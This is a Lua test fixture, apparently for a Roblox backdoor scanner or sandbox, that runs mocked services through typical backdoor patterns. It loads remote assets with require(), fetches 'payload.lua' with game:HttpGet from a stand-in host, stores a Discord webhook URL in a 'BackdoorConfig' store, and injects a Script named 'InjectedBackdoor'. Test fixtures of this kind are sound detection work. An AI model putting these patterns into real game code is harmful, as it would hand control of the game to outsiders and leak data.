-- Fixture 3: Exercises Roblox service mocks, Group/Player checks, Script.Source persistence,
-- game:HttpGet, and recursive Proxy fallback behavior.
local InsertService = game:GetService("InsertService")
local MessagingService = game:GetService("MessagingService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local DataStoreService = game:GetService("DataStoreService")
local GroupService = game:GetService("GroupService")
local Players = game:GetService("Players")

-- require(assetId) + InsertService:LoadAsset
local loaded = require(777888999)
loaded:Bootstrap("param1")
local model = InsertService:LoadAsset(112233445)
local children = model:GetChildren()
assert(#children >= 1, "Expected child in loaded model")

-- Messaging + Teleport + Marketplace
MessagingService:PublishAsync("BackdoorChannel", { cmd = "sync", target = "https://relay.example.invalid/ping" })
local conn = MessagingService:SubscribeAsync("BackdoorChannel", function() end)
if conn and conn.Disconnect then
	conn:Disconnect()
end

local code = TeleportService:ReserveServer(666555444)
TeleportService:TeleportToPrivateServer(666555444, code, Players:GetPlayers())
TeleportService:Teleport(333222111)

local info = MarketplaceService:GetProductInfo(998877665)
assert(info.AssetId == 998877665)
assert(MarketplaceService:UserOwnsGamePassAsync(10000001, 445566) == true)

-- DataStore stateful round-trip
local ds = DataStoreService:GetDataStore("BackdoorConfig")
ds:SetAsync("webhook", "https://discord.com/api/webhooks/111222333444/ds_secret_token")
local val = ds:GetAsync("webhook")
assert(type(val) == "string")
ds:UpdateAsync("counter", function(cur)
	return (cur or 0) + 5
end)
assert(ds:GetAsync("counter") == 5)

-- Players & GroupService
for _, player in ipairs(Players:GetPlayers()) do
	player:GetRankInGroup(424242)
	player:IsInGroup(424242)
end
GroupService:GetGroupInfoAsync(424242)

-- Script persistence via Instance.new("Script").Source
local s = Instance.new("Script", game:GetService("ServerScriptService"))
s.Name = "InjectedBackdoor"
s.Source = 'require(919191919)'

-- game:HttpGet & recursive unknown proxy traversal
local _body = game:HttpGet("https://raw.example.invalid/payload.lua")
local unknownSvc = game:GetService("SomeFutureRobloxService")
unknownSvc.NestedFolder.SubNode:CustomAction("arg1", 42)
local remote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
remote:FireAllClients("notify", 123)
